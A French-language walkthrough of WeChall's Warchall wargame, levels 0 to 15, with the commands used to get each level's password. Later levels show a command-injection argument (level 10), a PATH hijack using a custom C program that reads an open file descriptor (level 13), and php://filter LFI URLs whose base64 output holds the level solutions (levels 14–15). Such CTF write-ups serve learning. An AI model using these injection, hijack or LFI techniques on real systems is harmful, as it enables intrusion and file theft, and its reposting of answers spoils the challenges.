# WeChall
> logging into ssh to accees the warchall box



# [ level 0 ] 
- `cd /home/level/00_Welcome` : se diriger vers le dossier du niveau 0 .
- `ls` :regarder la liste des fichiers dans le dossier dans le dossier `00_Welcome`.
- `cat README.txt` : afficher le contenu du fichier `README.txt` .
- le mot de passe se trouve dans le fichier `README.txt`. 

# [ level 1 ]
 - `cd /home//level/01_choice_tree` : se diriger vers le dossier du niveau 1 .
 - `cd /blue/hats/grey/solution/patience` : apres avoir ete rediriger vers le dossier `patience`. 
 - `cat SOLUTION.txt` : le mot de passe se trouve dans ce fichier .

# [ level 2 ] 
 - `cd /home/level/02` : se diriger vers le dossier du niveau 2 .
 - `ls -al` : voir la liste des elements du dossier `02` , fichier cacher inclus.
 - `cd .porb` : on y trouve un dossier cacher `.porb` puis on va dans le dossier .
 - `ls -al` : voir de nouveau tous les elements du dossier `.porb` puis on a un fichier `.solution` .
 - `cat .solution` : le mot de passe se trouve dans ce fichier .

# [ level 3 ] 
 - `cd /home/level/03` :  se diriger vers le dossier du niveau 3 .
 - `ls -al` : voir la liste de tout les elements du dossier `03` .
 - `cat .bash_history` : le mot de passe se trouve sur la premiere ligne .

# [ level 4 ] 
 - `cd /home/level/04_kwisatz` : se diriger vers le dossier du niveau 4 .
 - `ls -al` : voir la liste de tout les elements du dossier `04_kwisatz`.
 - `cat README.nfo` : puis on nous demande de nous rediriger vers le repertoire principale .
 - `ls` : voir les elements du repertoire .
 - `cd level` : puis `ls` pourr voir le dossier `04_kwisatz`.
 - `cd 04_kwisatz` : puis `ls` pour voir les 02 fichiers `README2.md` et README.txt`.
 - `chmod 755 README2.md` puis `cat README2.md` : changer la permission puis afficher le contenu .
 - le mot de passe se trouve dans ce fichier `README2.md`.  

# [ level 5 ] 
 - `cd /home/level/05_privacyz` : se diriger vers le dossier du niveau 5 .
 - `cat README.md` : on affiche juste ce fichier et on trouve le mot de passe . 


# [ level 10 ]
## Dans ce challenge , le programme c nommée charp.c compte le  nombre de caractères par ligne d'un fichier.Pour avoir le mot de passe , j'ai d'abord chercher un moyen de mettre le programme en échéance, mais le mot de passe ne s'est toujours pas afficher après quelques manipulation, alors j'ai pensé à une autre solution, copier la solution dans un autre fichier dont nous avons des droits 7 , maiz pour pouvoir réaliser la copie de la solution, on doit mettre le programme en échéance et exécuter des commandes comme ci-dessous :

- `cd /home/level/10_choose_your_path` : se diriger vers le dossier du niveau 10 .
- `ls` : voir les elements du dossiers level10 .
- `./charp "nomRandom ; cat solution.txt > /home/user/randy/fichier.txt`: nomRandom devient un argument de ***charp2*** et  ***cat solution.txt > fichier.txt*** le deuxieme argument .
- On a pu realiser la condition pour faire echouer le programme ***c*** et le contenu de solution.txt est copier vers ***fichier.txt*** dans notre repertoire personnel  .
- `cat fichier.txt`: notre mot de passe se trouvera dans ce fichier .
  

# [ level 11 ]
## Ce challenge est une deuxième version du niveau 10 mais les instructions pour obtenir le mot de passe reste à quelques détails près les mêmes . Après l'analyse du code c du challenge j'en suis venue à cette solution :
- `cd /home/level/11_choose_your_path2` : se diriger vers le dossier du niveau 11 .
- `./charp2 '--files0-from=solution.txt'`: ***"--file0-from=fichier"*** : Cette option est generalement  utilisée pour lire les noms de fichiers dans une liste de fichier , mais dans notre cas, ***solution.txt*** n'est pas une liste mais un fichier , `charp2` interprete cet commande comme son argument et lis le contenu de ***solution.txt*** comme une liste de fichier , cependant ***solution.txt*** ne contient aucun nom de fichier valide , ce  qui met le programme en echeance , et qui affiche le mot de passe du challenge .
- ***NB : cette solution peut aussi être utiliser pour le niveau 10***  


# [ level 12 ] 
## Dans ce Challenge , Après l'analyse du code python du challenge,j'ai pu constater que le programme 'pyton' doit retourner true pour que l'on obtienne le mot de passe .
### le programme retourne true dans les cas suivants : 
- Quand un fichier ne peut plus être ouvert après sa première ouverture ou quand le contenu du fichier change constamment .
### Ma solution : 
- `cd /home/level//12_pytong` : se diriger vers le dossier du niveau 12 .
- `nano /home/user/randy/script : `  créer un script exécutable qui envoie des caracteres infini vers un fichier  que l'on va creer .
- `script` :
                     <pre>while true; do 
                             echo "blablabla"  >> changedfile </pre>
- `touch changedfile` : creation du fichier qui recevera le contenu du script
- `./script` : executer le script .
- Ouvrir une nouvelle fenetre putty sans fermer la session precedente pour executer le code python .
- Executer `script` script sur une fenetre et executer `pytong` sur une autre comme ceci : 
- `cd /home/level/12_pytong` et `./level12 /home/user/randy/changedfile` : executer le level12 dans le fichier qui change de contenu et le mot de passe s'affiche .

  # [ level 13 ]
## Dans ce challenge , apres avoir analyser la version compiler de tryout.c et quelque recherche sur internet, j'ai decouvert les descripteur de fichier (Il s'agit d'un identifiant digital utilisé pour désigner un fichier ouvert.) dans le repertoire /proc/self/fd/ . Dans notre cas, le descripteur de fichier 3 est attribué à solution.txt, qui contient notre solution. Toutefois, le descripteur de fichier de solution.txt reste ouvert jusqu'à la fin du programme, même après l'utilisation de /dev/urandom, ce qui paraît inhabituel. C'est cette anomalie que nous allons utiliser à notre avantage.
## Pour exploiter cette faille nous devons creer notre propre version de cat , ou prendre la version de quelqu'un d'autre . 
- Personnelement , j'ai trouver ce code cat sur internet :
 <pre>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
int main(int argc, char *argv[]) {
FILE *fp = fopen(argv[1], "w");
char buf[16];
memset(buf, 0, sizeof buf);
lseek(3, 0, SEEK_SET);
read(3, buf, sizeof buf);
fprintf(fp, "%s", buf);
return 0;
}

    </pre>
    
- nous allons ensuite compiler ce code avec la commande suivante : `gcc -m32 cat.c -o cat` et `cat` deviendra la  version compiler de cat.c , le nom du programme compiler doit etre `cat` parce qu'on doit faire en sorte que le programme utilise notre `cat` au lieu de la commande de base . 
- On executera ensuite notre `cat` dans notre repertoire personnel `./cat ` .
- On doit changer la variable de l'environnement pour faciliter l'acces aux scripts ou programmes dans notre répertoire personnel  avec la commande suivante :
```
export PATH=$HOME:$PATH
```
- puis `cd /home/level/matrixman/13_tryouts/` et on execute `tryouts`
- Après l'exécution de `tryouts`, on quitte le programme et on remet la variable d'environnement à sa valeur initiale avec la commande suivante :
  ```
  export PATH=$PATH
- Puis on fait juste `nano /home/user/randy/seed` et on obtient notre mot de passe . 

# [ level 14 ]
##  Dans ce challenge ,pour récupérer le mot de passe on doit réaliser un LFI(Local File Intrusion) , Après avoir regarder des indices dans le forum de wechall ,  l'auteur du challenge nous à laisser un indice très essentiel ,qui dit que la mot de passe de la solution du challenge se trouve dans un file nommé solution.php . Après avoir googlés des infos sur php//filter et des techniques de LFI , j'en suis venue à cette solution :
- Cliquez sur le lien du challenge  **Live LFI** puis elle vous redirigera vers un site .
- Cliquez sur l'un des deux drapeaux : le drapeau **anglais** ou le drapeau **allemand** pour changer la langue et l' URL changera comme ceci :
  <pre>https://lfi.warchall.net/index.php?lang=en</pre>
- Puis on change comme ci-dessous l'URL :
  <pre>https://lfi.warchall.net/index.php?lang=php://filter/convert.base64-encode/resource=solution.php</pre>
- On utilise ici ***php://filter*** pour introduire ***l'encodage en base64*** , et on utilise l'encodage en base64 pour contourner les filtres ou les contrôles de sécurités mis en places .  
- Puis on actualise et le contenu change et cela s'affiche :
  ```plaintext

  PGh0bWw+Cjxib2R5Pgo8cHJlIHN0eWxlPSJjb2xvcjojMDAwOyI+dGVoIGZhbGcgc2kgbmFlciE8L3ByZT4KPHByZSBzdHlsZT0iY29sb3I6I2ZmZjsiPnRoZSBmbGFnIGlzIG5lYXIhPC9wcmU+CjwvYm9keT4KPC9odG1sPgo8P3BocCAgICAgICAgICAgICAgICAgICMgICBZT1VSX1RST1BIWSAKcmV0dXJuICdTdGVwcGluU3RvbmVzNDJQaWUnOyAjIDwtwrQgPz4K


- Il s'agit du contenu de `solution.php` mais il faut encore le decoder
- Nous allons ensuite ouvrir notre putty et decoder ce long texte dans un repertoire dont nous avons des droits ouverts .
- Nous allons ensuite executer la commande suivante :
- `echo " `
 ```
- PGh0bWw+Cjxib2R5Pgo8cHJlIHN0eWxlPSJjb2xvcjojMDAwOyI+dGVoIGZhbGcgc2kgbmFlciE8L3ByZT4KPHByZSBzdHlsZT0iY29sb3I6I2ZmZjsiPnRoZSBmbGFnIGlzIG5lYXIhPC9wcmU+CjwvYm9keT4KPC9odG1sPgo8P3BocCAgICAgICAgICAgICAgICAgICMgICBZT1VSX1RST1BIWSAKcmV0dXJuICdTdGVwcGluU3RvbmVzNDJQaWUnOyAjIDwtwrQgPz4K"
```

- `" | base64 -d -i`
- Et le mot de passe va ensuite s'afficher .


# [ level 15 ] 
## Ce challenge est exactement le même que le challenge LFI .
- Nous allons cliquer sur le lien du challenge ***Right-Fi***
- Cliquez sur **EN** ou **DE** en haut a droite et l'URL changera comme tels :
  ```
  https://rfi.warchall.net/index.php?lang=en
- Rajoutons des éléments sur l'url comme ci-dessous :
  ```
  https://rfi.warchall.net/index.php?lang=php://filter/convert.base64-encode/resource=solution.php

 - La page d'acceuil s'affichera mais il y a un long message et des messages de ***Warning*** qui sont ajoutées .
 - Nous allons ensuite copier le texte incomprehensible et le decoder avec les commandes suivantes :
 - `echo " ` :
   ```
   PGh0bWw+Cjxib2R5Pgo8cHJlPk5PVEhJTkcgSEVSRT8/Pz88L3ByZT4KPC9ib2R5Pgo8L2h0bWw+CgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocCByZXR1cm4gJ0xvd19INE5HSU5HX0ZydWl0JzsgPz4K

 - `" | base64 -d -i ` : et le mot de passe s'affichera ensuite tout en bas a gauche  .


